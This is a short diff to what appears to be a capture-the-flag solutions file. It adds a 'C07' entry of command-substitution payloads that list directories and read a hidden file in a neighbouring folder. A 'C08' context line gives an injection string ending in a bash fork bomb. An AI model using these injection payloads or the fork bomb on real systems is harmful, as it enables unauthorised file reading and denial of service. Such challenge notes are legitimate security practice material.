@@ -104,6 +104,13 @@ print(s.recv(2048))
 
 s.close()
 ```
+C07
+
+$(ls -a)
+$(ls -a ..)
+$(ls -a ../robot-bank-job)
+$(cat -a ../robot-bank-job/.robot_sketches.txt)
+
 
 C08
 Hand to inject: cryptonite -n; :(){ :|:& };: (fork bomb)
